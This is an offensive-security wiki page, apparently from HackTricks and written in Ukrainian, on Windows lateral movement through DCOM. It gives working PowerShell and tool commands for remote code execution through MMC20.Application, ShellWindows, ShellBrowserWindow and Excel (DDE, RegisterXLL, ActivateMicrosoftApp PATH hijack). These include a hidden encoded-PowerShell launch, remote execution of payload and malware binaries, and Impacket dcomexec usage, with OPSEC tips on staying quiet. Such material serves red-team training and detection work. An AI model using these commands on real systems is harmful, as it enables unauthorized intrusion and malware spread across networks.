# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement привабливий, оскільки повторно використовує наявні COM servers, доступні через RPC/DCOM, замість створення service або scheduled task. На практиці це означає, що початкове з'єднання зазвичай починається через TCP/135, а потім переходить на динамічно призначені високі RPC ports.

## Передумови та підводні камені

- Зазвичай на target потрібен контекст локального адміністратора, а remote COM server має дозволяти remote launch/activation.
- Починаючи з **14 березня 2023 року**, Microsoft застосовує DCOM hardening для supported systems. Старі clients, які запитують низький activation authentication level, можуть завершуватися помилкою, якщо не узгодять щонайменше `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Сучасні Windows clients зазвичай автоматично підвищують цей рівень, тому поточні tools зазвичай продовжують працювати.<sup>[[3]](#references)</sup>
- Для ручного або scripted DCOM execution зазвичай потрібен TCP/135, а також dynamic RPC port range target. Якщо ви використовуєте Impacket's `dcomexec.py` і хочете отримувати назад output команд, зазвичай також потрібен SMB access до `ADMIN$` (або іншого writable/readable share).
- Якщо RPC/DCOM працює, але SMB заблокований, `dcomexec.py -nooutput` все одно може бути корисним для blind execution.

Швидкі перевірки:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Докладніше про цю техніку див. в оригінальній публікації [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects provide an interesting capability for network-based interactions with objects. Microsoft provides comprehensive documentation for both DCOM and Component Object Model (COM), доступну [тут для DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) та [тут для COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Список DCOM applications можна отримати за допомогою PowerShell command:
```bash
Get-CimInstance Win32_DCOMApplication
```
Об'єкт COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), дає змогу створювати скрипти для операцій MMC snap-in. Зокрема, цей об'єкт містить метод `ExecuteShellCommand` у `Document.ActiveView`. Додаткову інформацію про цей метод можна знайти [тут](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Перевірте його запуск:

Ця функція дає змогу виконувати команди через мережу за допомогою DCOM application. Для віддаленої взаємодії з DCOM як адміністратор можна використати PowerShell:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ця команда підключається до DCOM application і повертає instance COM object. Після цього можна викликати method ExecuteShellCommand для виконання процесу на віддаленому host. Процес складається з таких кроків:

Перевірити methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Отримати RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Останній аргумент — це стиль вікна. `7` залишає вікно мінімізованим. З операційного погляду, виконання на основі MMC зазвичай призводить до того, що віддалений процес `mmc.exe` породжує ваш payload, що відрізняється від об’єктів на основі Explorer, описаних нижче.

## ShellWindows & ShellBrowserWindow

**Щоб дізнатися більше про цю техніку, перегляньте оригінальний допис [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Було виявлено, що об’єкту **MMC20.Application** бракує явних "LaunchPermissions", тому за замовчуванням використовуються дозволи, які надають доступ Administrators. Додаткову інформацію можна знайти [тут](https://twitter.com/tiraniddo/status/817532039771525120), а для фільтрації об’єктів без явного Launch Permission рекомендується використовувати OleView .NET від [@tiraniddo](https://twitter.com/tiraniddo).

Два конкретні об’єкти, `ShellBrowserWindow` і `ShellWindows`, були виділені через відсутність у них явних Launch Permissions. Відсутність запису реєстру `LaunchPermission` у `HKCR:\AppID\{guid}` означає відсутність явних дозволів.

Порівняно з `MMC20.Application`, ці об’єкти часто є тихішими з погляду OPSEC, оскільки команда на віддаленому хості зазвичай стає дочірнім процесом `explorer.exe`, а не `mmc.exe`.

### ShellWindows

Для `ShellWindows`, який не має ProgID, методи .NET `Type.GetTypeFromCLSID` і `Activator.CreateInstance` спрощують створення екземпляра об’єкта за допомогою його AppID. У цьому процесі використовується OleView .NET для отримання CLSID `ShellWindows`. Після створення екземпляра взаємодія можлива через метод `WindowsShell.Item`, що дає змогу викликати методи на кшталт `Document.Application.ShellExecute`.

Наведено приклади команд PowerShell для створення екземпляра об’єкта та віддаленого виконання команд:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` схожий, але його можна безпосередньо створити через його CLSID і виконати pivot до `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement за допомогою Excel DCOM Objects

Lateral movement можна здійснити шляхом експлуатації Excel DCOM objects. Для отримання детальної інформації рекомендується ознайомитися з обговоренням використання Excel DDE для lateral movement через DCOM у [блозі Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Проєкт Empire містить PowerShell script, який демонструє використання Excel для remote code execution (RCE) шляхом маніпуляції DCOM objects. Нижче наведено фрагменти script, доступного в [GitHub repository Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), що демонструють різні методи зловживання Excel для RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Нещодавні дослідження розширили цю область за допомогою методу `Excel.Application` `ActivateMicrosoftApp()`. Ключова ідея полягає в тому, що Excel може намагатися запускати застарілі застосунки Microsoft, такі як FoxPro, Schedule Plus або Project, здійснюючи пошук у системній змінній `PATH`. Якщо оператор може розмістити payload з одним із очікуваних імен у доступному для запису розташуванні, яке входить до `PATH` цільової системи, Excel виконає його.<sup>[[4]](#references)</sup>

Вимоги для цього варіанта:

- Локальні права адміністратора на цільовій системі
- Excel, встановлений на цільовій системі
- Можливість записати payload до доступного для запису каталогу в `PATH` цільової системи

Практичний приклад використання пошуку FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Якщо на атакуючому хості не зареєстровано локальний `Excel.Application` ProgID, натомість створіть віддалений об’єкт за допомогою CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Значення, які на практиці використовувалися зловмисниками:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Інструменти автоматизації для Lateral Movement

Для автоматизації цих технік виділено два інструменти:

- **Invoke-DCOM.ps1**: PowerShell-скрипт, наданий проєктом Empire, який спрощує виклик різних методів виконання коду на віддалених машинах. Цей скрипт доступний у GitHub-репозиторії Empire.

- **SharpLateral**: інструмент, призначений для віддаленого виконання коду, який можна використовувати за допомогою команди:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Автоматичні інструменти

- Powershell-скрипт [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) дає змогу легко викликати всі прокоментовані способи виконання code на інших машинах.
- Ви можете використовувати `dcomexec.py` з Impacket для виконання команд у віддалених системах за допомогою DCOM. Поточні збірки підтримують `ShellWindows`, `ShellBrowserWindow` і `MMC20`, а за замовчуванням використовується `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Ви також можете використати [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Ви також можете використати [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Посилання

- [1] [Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442 — керування змінами для обходу функції безпеки Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: зловживання можливостями DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Використання Excel DDE для lateral movement через DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)

{{#include ../../banners/hacktricks-training.md}}
